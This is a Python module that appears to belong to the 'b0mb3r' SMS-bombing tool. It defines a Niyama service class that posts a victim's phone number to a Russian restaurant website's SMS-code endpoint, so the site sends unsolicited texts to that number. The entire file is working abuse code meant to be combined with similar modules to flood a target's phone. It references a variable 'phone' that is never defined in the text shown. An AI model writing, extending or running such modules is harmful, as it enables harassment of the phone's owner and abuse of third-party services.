from b0mb3r.services.service import Service


class Niyama(Service):
    async def run(self):
        await self.post(
            "https://www.niyama.ru/ajax/sendSMS.php",
            data={"REGISTER[PERSONALphone]": phone, "code": "", "sendsms": "Выслать код"},
        )
